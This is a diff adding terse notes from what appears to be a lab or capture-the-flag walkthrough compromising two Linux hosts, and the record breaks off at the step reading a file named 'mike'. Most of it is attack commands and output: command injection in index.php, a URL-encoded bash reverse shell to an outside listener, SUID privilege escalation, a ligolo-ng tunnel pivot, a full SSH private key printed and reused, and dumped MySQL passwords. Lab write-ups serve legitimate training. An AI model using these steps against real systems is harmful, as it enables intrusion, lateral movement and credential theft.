@@ -1,0 +1,474 @@
+
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -u http://10.65.133.95/FUZZ --hc 404
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.65.133.95/FUZZ
+Total requests: 37050
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                             
+=====================================================================
+
+000000001:   200        16 L     60 W       329 Ch      "index.php"                                         
+000000069:   200        375 L    964 W      10918 Ch    "index.html"                                        
+000000157:   403        9 L      28 W       277 Ch      ".htaccess"                                         
+000000271:   200        762 L    4033 W     69197 Ch    "info.php"  
+
+
+
+
+http://10.65.133.95/index.php
+
+
+<html>
+<body>
+	<pre>
+	total 28K
+drwxr-xr-x 2 root root 4.0K Jul 16  2021 .
+drwxr-xr-x 3 root root 4.0K Jul 15  2021 ..
+-rw-r--r-- 1 root root  11K Jul 15  2021 index.html
+-rw-r--r-- 1 root root  154 Jul 16  2021 index.php
+-rw-r--r-- 1 root root   20 Jul 15  2021 info.php
+	<pre>
+
+<!--  where is the path ?  -->
+
+</body>
+</html>
+
+
+we get code execution
+
+http://10.65.133.95/index.php?path=/;id
+
+
+
+	total 72K
+drwxr-xr-x  22 root   root    4.0K Jul 15  2021 .
+drwxr-xr-x  22 root   root    4.0K Jul 15  2021 ..
+drwxr-xr-x   2 root   root    4.0K Nov 30 07:32 bin
+drwxr-xr-x   2 root   root    4.0K Jun 29  2021 boot
+drwxr-xr-x   8 root   root     500 Nov 30 07:22 dev
+drwxr-xr-x  81 root   root    4.0K Nov 30 07:32 etc
+drwxr-xr-x   3 root   root    4.0K Jul 19  2021 home
+drwxr-xr-x  16 root   root    4.0K Jun 29  2021 lib
+drwxr-xr-x   2 root   root    4.0K Apr 27  2025 lib64
+drwxr-xr-x   2 root   root    4.0K Jun 29  2021 media
+drwxr-xr-x   2 root   root    4.0K Jun 29  2021 mnt
+drwxr-xr-x   2 root   root    4.0K Jun 29  2021 opt
+dr-xr-xr-x 212 nobody nogroup    0 Nov 30 07:22 proc
+drwx------   6 root   root    4.0K Jul 19  2021 root
+drwxr-xr-x  17 root   root     720 Nov 30 07:32 run
+drwxr-xr-x   2 root   root    4.0K Nov 30 07:33 sbin
+drwxr-xr-x   2 root   root    4.0K Jul 14  2021 snap
+drwxr-xr-x   2 root   root    4.0K Jun 29  2021 srv
+dr-xr-xr-x  13 nobody nogroup    0 Nov 30 07:22 sys
+drwxrwxrwt   8 root   root    4.0K Nov 30 07:33 tmp
+drwxr-xr-x  11 root   root    4.0K Jun 29  2021 usr
+drwxr-xr-x  14 root   root    4.0K Jul 15  2021 var
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+	
+
+10.65.133.95/index.php?path=/;bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.141.97%2F443%200%3E%261%27
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lnvp 443                         
+listening on [any] 443 ...
+connect to [192.168.141.97] from (UNKNOWN) [10.65.133.95] 41194
+bash: cannot set terminal process group (249): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@host1:/var/www/html$ 
+
+
+
+www-data@host1:/home/mike$ find / -perm -u=s -type f 2>/dev/null
+/usr/share/man/zh_TW/crypt
+/usr/bin/newuidmap
+/usr/bin/newgidmap
+/usr/bin/passwd
+/usr/bin/chfn
+/usr/bin/at
+/usr/bin/chsh
+/usr/bin/newgrp
+/usr/bin/sudo
+/usr/bin/gpasswd
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/snapd/snap-confine
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/bin/mount
+/bin/ping
+/bin/su
+/bin/umount
+/bin/fusermount
+/bin/ping6
+www-data@host1:
+
+
+www-data@host1:/home/mike$ /usr/share/man/zh_TW/crypt mike
+░█████╗░██████╗░██╗░░░██╗██████╗░████████╗░██████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░░
+██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗╚══██╔══╝██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░░
+██║░░╚═╝██████╔╝░╚████╔╝░██████╔╝░░░██║░░░╚█████╗░███████║█████╗░░██║░░░░░██║░░░░░
+██║░░██╗██╔══██╗░░╚██╔╝░░██╔═══╝░░░░██║░░░░╚═══██╗██╔══██║██╔══╝░░██║░░░░░██║░░░░░
+╚█████╔╝██║░░██║░░░██║░░░██║░░░░░░░░██║░░░██████╔╝██║░░██║███████╗███████╗███████╗
+░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝
+
+root@host1:/home/mike# id
+uid=0(root) gid=33(www-data) groups=33(www-data)
+
+
+
+
+
+root@host1:/# hostnamectl
+   Static hostname: host1
+         Icon name: computer-container
+           Chassis: container
+        Machine ID: f0880e7f45a4495ba34f5ef3f6f696b5
+           Boot ID: d3321fb1af09422aa80854e46a4c032f
+    Virtualization: lxc
+  Operating System: Ubuntu 18.04.5 LTS
+            Kernel: Linux 5.15.0-139-generic
+      Architecture: x86-64
+
+
+root@host1:/# ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.250.10  netmask 255.255.255.0  broadcast 192.168.250.255
+        inet6 fe80::216:3eff:fe9c:ff0f  prefixlen 64  scopeid 0x20<link>
+        ether 00:16:3e:9c:ff:0f  txqueuelen 1000  (Ethernet)
+        RX packets 1408  bytes 98267 (98.2 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 1078  bytes 965212 (965.2 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 172.16.20.2  netmask 255.255.255.0  broadcast 172.16.20.255
+        inet6 fe80::216:3eff:fe46:6b29  prefixlen 64  scopeid 0x20<link>
+        ether 00:16:3e:46:6b:29  txqueuelen 1000  (Ethernet)
+        RX packets 33  bytes 2622 (2.6 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 29  bytes 2206 (2.2 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 182630  bytes 58662071 (58.6 MB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 182630  bytes 58662071 (58.6 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+root@host1:/# netstat -tunlp
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      4926/sshd           
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      5523/systemd-resolv 
+tcp6       0      0 :::22                   :::*                    LISTEN      4926/sshd           
+tcp6       0      0 :::80                   :::*                    LISTEN      5224/apache2        
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           5523/systemd-resolv 
+udp        0      0 192.168.250.10:68       0.0.0.0:*                           5516/systemd-networ 
+root@host1:/# which nmap
+root@host1:/# 
+
+
+could transfer nmap, but lets have more fun
+
+lets tunnel
+
+
+root@host1:/# ./agent -connect 192.168.141.97:11601 -retry -ignore-cert
+WARN[0000] warning, certificate validation disabled     
+INFO[0000] Connection established                        addr="192.168.141.97:11601"
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# ./proxy -selfcert
+INFO[0000] Loading configuration file ligolo-ng.yaml    
+WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
+ERRO[0000] Certificate cache error: acme/autocert: certificate cache miss, returning a new certificate 
+INFO[0000] Listening on 0.0.0.0:11601                   
+INFO[0000] Starting Ligolo-ng Web, API URL is set to: http://127.0.0.1:8080 
+WARN[0000] Ligolo-ng API is experimental, and should be running behind a reverse-proxy if publicly exposed. 
+    __    _             __                       
+   / /   (_)___ _____  / /___        ____  ____ _
+  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
+ / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
+/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
+        /____/                          /____/   
+
+  Made in France ♥            by @Nicocha30!
+  Version: 0.8.2
+
+ligolo-ng » INFO[0045] Agent joined.                                 id=00163e9cff0f name=root@host1 remote="10.65.133.95:49148"
+ligolo-ng » session 1
+error: invalid usage of command 'session' (unconsumed input '1'), try 'help'
+ligolo-ng » session
+? Specify a session : 1 - root@host1 - 10.65.133.95:49148 - 00163e9cff0f
+[Agent : root@host1] » ifconfig
+┌────────────────────────────────────┐
+│ Interface 0                        │
+├──────────────┬─────────────────────┤
+│ Name         │ lo                  │
+│ Hardware MAC │                     │
+│ MTU          │ 65536               │
+│ Flags        │ up|loopback|running │
+│ IPv4 Address │ 127.0.0.1/8         │
+│ IPv6 Address │ ::1/128             │
+└──────────────┴─────────────────────┘
+┌───────────────────────────────────────────────┐
+│ Interface 1                                   │
+├──────────────┬────────────────────────────────┤
+│ Name         │ eth0                           │
+│ Hardware MAC │ 00:16:3e:9c:ff:0f              │
+│ MTU          │ 1500                           │
+│ Flags        │ up|broadcast|multicast|running │
+│ IPv4 Address │ 192.168.250.10/24              │
+│ IPv6 Address │ fe80::216:3eff:fe9c:ff0f/64    │
+└──────────────┴────────────────────────────────┘
+┌───────────────────────────────────────────────┐
+│ Interface 2                                   │
+├──────────────┬────────────────────────────────┤
+│ Name         │ eth1                           │
+│ Hardware MAC │ 00:16:3e:46:6b:29              │
+│ MTU          │ 1500                           │
+│ Flags        │ up|broadcast|multicast|running │
+│ IPv4 Address │ 172.16.20.2/24                 │
+│ IPv6 Address │ fe80::216:3eff:fe46:6b29/64    │
+└──────────────┴────────────────────────────────┘
+[Agent : root@host1] »  
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# ip tuntap add user root mode tun ligolo
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# ip link set ligolo up   
+
+
+[Agent : root@host1] » start
+INFO[0203] Starting tunnel to root@host1 (00163e9cff0f) 
+[Agent : root@host1] »  
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# ip route add 172.16.20.0/24 dev ligolo
+                                             
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# nmap -sCV -sV -p- 172.16.20.2 --open
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-30 09:21 EST
+Nmap scan report for 172.16.20.2
+Host is up (0.060s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 a6:3e:80:d9:b0:98:fd:7e:09:6d:34:12:f9:15:8a:18 (RSA)
+|   256 ec:5f:8a:1d:59:b3:59:2f:49:ef:fb:f4:4a:d0:1d:7a (ECDSA)
+|_  256 b1:4a:22:dc:7f:60:e4:fc:08:0c:55:4f:e4:15:e0:fa (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 26.95 seconds
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+port 80 is just the default apache2 
+
+
+root@host1:/home/mike/.ssh# cat id_rsa
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEAnWmOnLHQfBxrW0W0YuCiTuuGjCMUrISE4hdDMMuZruW6nj+z
+YQCmjcL3T4j7v3/ddOBsTgxwi/+ZRZtRqJlvKEevPHJ8cR1DX7mmNyU3w/DRMnrW
+djcIozYXVYdmj9v3e8xPbR6ybJX6fKpTuaDVdiwqQAecbvs5tBUkonAYUBuv1nhb
+p/6+ZRYWNWv9RXE1XRuhROXD1Kl/tm7z4EcGZEDHu36oka23JJL7vzMeNtAdz3JF
+wlGAtXH1cpdNa3+JKl/dBrRjV+YT3YivlqA2z4tRx/sA91RTxEO5oTYEL0bR1cKg
+UPf1b21ecna8mpvQnkQmqQe8W9tSSlzVb6jnowIDAQABAoIBAA09O4liSy6lFUJv
+8mP+kKgilwZiTPLVkneRjU0lUp+rIq78nJGkBF4X78T4uHO6xV13IqTN1wlvTezU
+y2FqxjaVEN/8oQrCc1AxxREOSEpqjq24NyFqL4fKnNvMr4uZ7I60+FktI8SOOKsT
+iEcsh8eQn10TRszuxEOpI5Ol6eWSzMPKxuw4ChniJsvaz8IDkYd4O/MDddjgcttb
+Wv+LhX7qANPnRzeIDUNG2wmy3U+gxIJno/h3Xec0kVNQ0qwZmr56DO9G1oBbTU+4
+6ynpIG2hEbSwGktWmnfw/4O+DZr8NiqeLY10G0MIwFIycuj2QfIF+mY6nqCZPWrH
+8Lkf8wECgYEA0PMS/uqxL5u4e+bwSPdtfhEvFxk33/+PWMFIx0c5v7/jwtSW+/0v
+YEIDC/DmHh9h4aF8dHMg8x18B50dw0HuLHWIgezNjJ9M8jwQgixRGamc5m6oFWh5
+59581KWVIuDFqLG/6DN6cW/QQDo2MrNKP3QADeUPb2jhflzmir0TDLECgYEAwNud
+VzZ6ON5YvbJbNh/JltSS1jAqUftzheX/m+3VrjE0iChLGvyP84aY7qpbiXNLHe+3
+1/4JPoTljlml2RMTdZjAiF52u6KXwOLx6alGFoSbmAoZYG/4/Z0pwLjcozWGrjYD
+03EDPdCclzWFyCqD9pYFGVAvEJuqx3rGYm1x/pMCgYEA0IdWFNwqOsYhBl6CvX9Z
+YbBKm7XKQp2s9LnpJSAbLReXebBqgk+6gUk/+yHOto9BQ0nDiAACCT8KshqGQoDA
+7tPZiTjIJqgwxatWGmOaCI9yi7IxwzPCPbqYQCyEOwuxl9rVGCqP7zfU0NSHlG/E
+ELF3AGby0ZANQuv6FMn/gfECgYEAkjoyK31P4KyeBn8kb35coDNffm2YuP56Ei1Y
+yMblPKVsWkyK3dRf5VrJvDSJIUe8zd8Duw6PvcqQL4XDnTq8h26hlQRi7FQU0hiB
+KhTB4rL7MqV9pkRgOxOeI9VG3azpCFBGSFypA4aYJIJdhG7QDfijtxS4CtStAYES
+yHCJfWcCgYAFzAx6hwi9smlvCpoZ1D8TRyqlxKf4YtSkTl74ZyiRESfvpuZSiclg
+mFdVoHOt+gkpsXkmGmuqymIBRYGEw3dJ2C4MRPjx0UFpua0BAZ5k0ly6eaZuejWj
+0/AHOf/jOfwvM4G2X0L8yjJqq/5F6NOjf9uxEusphzDcr/I1inuY3A==
+-----END RSA PRIVATE KEY-----
+
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# ssh -i m_rsa mike@172.16.20.2                         
+The authenticity of host '172.16.20.2 (172.16.20.2)' can't be established.
+ED25519 key fingerprint is SHA256:mMbUA2y6p+S0PriDGDheemiz88Jsn8dfextdWlNpZxQ.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '172.16.20.2' (ED25519) to the list of known hosts.
+mike@172.16.20.2's password: 
+Permission denied, please try again.
+mike@172.16.20.2's password: 
+Permission denied, please try again.
+mike@172.16.20.2's password: 
+mike@172.16.20.2: Permission denied (publickey,password).
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# ssh2john m_rsa               
+m_rsa has no password!
+
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# nmap -p22 172.16.20.0/24 -v --open
+...
+Host is up (0.025s latency).
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+
+Nmap scan report for 172.16.20.6
+Host is up (0.039s latency).
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+
+Read data files from: /usr/share/nmap
+Nmap done: 256 IP addresses (256 hosts up) scanned in 9.61 seconds
+           Raw packets sent: 2077 (80.864KB) | Rcvd: 264 (10.532KB)
+                                                                                                                    
+┌──(root㉿kali)-[/home/kali]
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# ssh -i m_rsa mike@172.16.20.6
+...
+Last login: Mon Jul 19 20:23:18 2021 from 172.16.20.2
+mike@host2:~$ 
+
+
+
+
+mike@host2:/$ netstat -tunlp
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
+mike@host2:/$ 
+
+
+
+you are expected to guess these credentials....
+they are not found together in any file within the system on either host
+grep -ril --exclude-dir=/proc --exclude-dir=/sys --exclude-dir=/dev "mike" / | xargs grep -i "password"
+
+
+mike@host2:/usr/share/mysql$ mysql -umike -ppassword
+mysql: [Warning] Using a password on the command line interface can be insecure.
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 2
+Server version: 5.7.34-0ubuntu0.18.04.1 (Ubuntu)
+
+Copyright (c) 2000, 2021, Oracle and/or its affiliates.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| accounts           |
++--------------------+
+2 rows in set (0.01 sec)
+
+mysql> use accounts;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> show tables;
++--------------------+
+| Tables_in_accounts |
++--------------------+
+| users              |
++--------------------+
+1 row in set (0.00 sec)
+
+mysql> select * from users;
++-------+---------------------+
+| login | password            |
++-------+---------------------+
+| root  | bjsig4868fgjjeog    |
+| mike  | WhatAreYouDoingHere |
++-------+---------------------+
+2 rows in set (0.00 sec)
+
+mysql> 
+
+
+
+
+mike@host2:/usr/share/mysql$ su root
+Password: 
+root@host2:/usr/share/mysql# cd /root
+root@host2:~# ls -lsa
+total 28
+4 drwx------  4 root root 4096 Jul 19  2021 .
+4 drwxr-xr-x 22 root root 4096 Jun 29  2021 ..
+0 lrwxrwxrwx  1 root root    9 Jul 19  2021 .bash_history -> /dev/null
+4 -rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
+4 drwxr-xr-x  3 root root 4096 Jul 15  2021 .local
+4 -rw-r--r--  1 root root  148 Aug 17  2015 .profile
+4 drwx------  2 root root 4096 Jul 15  2021 .ssh
+4 -rw-------  1 root root  218 Jul 16  2021 mike.zip
+root@host2:~# unzip mike.zip
+Archive:  mike.zip
+[mike.zip] mike password: 
+ extracting: mike                    
+root@host2:~# ls
+mike  mike.zip
+root@host2:~# cat mike
+
+
+
+
+
